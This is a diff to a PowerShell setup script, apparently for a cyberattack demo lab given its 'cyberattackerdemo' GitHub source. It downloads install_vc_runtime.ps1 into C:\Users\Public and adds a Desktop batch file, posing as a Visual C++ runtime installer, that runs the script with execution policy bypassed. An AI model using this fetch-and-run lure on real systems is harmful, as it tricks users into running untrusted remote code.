@@ -109,11 +109,21 @@ Run-Step "Downloading enable_acs.ps1 to Public folder" {
     Invoke-WebRequest -Uri $acsScriptUrl -OutFile $acsScriptPath
 }
 
-Run-Step "Downloading install_vc_runtime.ps1 to Desktop" {
-    $desktopPath = [Environment]::GetFolderPath("Desktop")
+Run-Step "Downloading install_vc_runtime.ps1 to Public" {
+    $publicPath = "C:\Users\Public\install_vc_runtime.ps1"
     $downloadUrl = "https://raw.githubusercontent.com/cyberattackerdemo/public/main/install_vc_runtime.ps1"
-    $destinationPath = Join-Path $desktopPath "install_vc_runtime.ps1"
-    Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath
+    Invoke-WebRequest -Uri $downloadUrl -OutFile $publicPath
+}
+
+Run-Step "Creating shortcut .bat on Desktop" {
+    $desktopPath = [Environment]::GetFolderPath("Desktop")
+    $batPath = Join-Path $desktopPath "Run_Install_VC_Runtime.bat"
+
+    $batContent = "@echo off`r`n" +
+        "powershell -ExecutionPolicy Bypass -File ""C:\Users\Public\install_vc_runtime.ps1""`r`n" +
+        "pause"
+
+    Set-Content -Path $batPath -Value $batContent -Encoding ASCII
 }
 
 Write-Log "Setup completed. Please restart the system to apply the Japanese UI and IME settings."
